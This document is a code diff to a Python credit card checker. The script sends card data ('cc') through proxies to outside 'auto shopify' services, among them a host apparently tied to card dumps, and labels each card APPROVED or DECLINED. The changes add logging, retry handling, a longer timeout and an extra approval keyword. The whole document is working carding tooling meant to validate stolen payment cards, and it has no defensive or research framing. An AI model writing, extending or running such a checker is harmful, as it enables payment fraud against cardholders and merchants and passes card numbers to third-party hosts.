@@ -2,13 +2,16 @@ import requests
 import traceback
 import urllib3
 import random
+import logging
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+logger = logging.getLogger(__name__)
 
-# List of API endpoints (primary first)
+# List of API endpoints – add as many as you want
 SHOPIFY_APIS = [
     "https://kamalxd.tech/sh/index.php",
-    "https://hqdumps.com/autoshopify/index.php"
+    "https://hqdumps.com/autoshopify/index.php",
+    # Add more here if available
 ]
 
 def format_proxy(proxy):
@@ -42,14 +45,15 @@ def check_site_shopify_direct(site_url, cc, proxy=None):
     headers = {'User-Agent': random.choice(user_agents)}
     proxies = format_proxy(proxy) if proxy else None
 
-    for api_url in SHOPIFY_APIS:
+    for idx, api_url in enumerate(SHOPIFY_APIS):
         try:
+            logger.info(f"Trying API {idx+1}: {api_url}")
             response = requests.get(
                 api_url,
                 params=params,
                 headers=headers,
                 proxies=proxies,
-                timeout=15,
+                timeout=20,          # slightly longer to avoid premature timeout
                 verify=False
             )
             data = response.json()
@@ -61,7 +65,7 @@ def check_site_shopify_direct(site_url, cc, proxy=None):
 
                 status = 'ERROR'
                 resp_lower = resp_text.lower()
-                if 'approved' in resp_lower or 'live' in resp_lower or 'success' in resp_lower:
+                if 'approved' in resp_lower or 'live' in resp_lower or 'success' in resp_lower or 'completed' in resp_lower:
                     status = 'APPROVED'
                 elif 'declined' in resp_lower:
                     status = 'DECLINED'
@@ -72,6 +76,7 @@ def check_site_shopify_direct(site_url, cc, proxy=None):
                 elif 'do not honor' in resp_lower:
                     status = 'DECLINED'
 
+                logger.info(f"API {idx+1} returned: {resp_text} (status: {status})")
                 return {
                     'Response': resp_text,
                     'status': status,
@@ -79,12 +84,21 @@ def check_site_shopify_direct(site_url, cc, proxy=None):
                     'price': price,
                     'site': site
                 }
-            # Not a valid response – try next API
+            else:
+                logger.warning(f"API {idx+1} returned invalid JSON structure: {data}")
+                continue  # try next API
+        except requests.exceptions.Timeout:
+            logger.error(f"API {idx+1} timeout")
+            continue
+        except requests.exceptions.ProxyError as e:
+            logger.error(f"API {idx+1} proxy error: {e}")
+            continue
         except Exception as e:
-            print(f"API {api_url} failed: {e}")
+            logger.error(f"API {idx+1} failed: {e}")
             continue
 
     # All APIs failed
+    logger.error("All Shopify APIs failed")
     return {
         'Response': 'All APIs failed',
         'status': 'ERROR',
@@ -114,4 +128,3 @@ def process_response_shopify(api_response, site_price='0'):
 
     except Exception as e:
         return f"Parse Error: {e}", "ERROR", "Unknown"
-
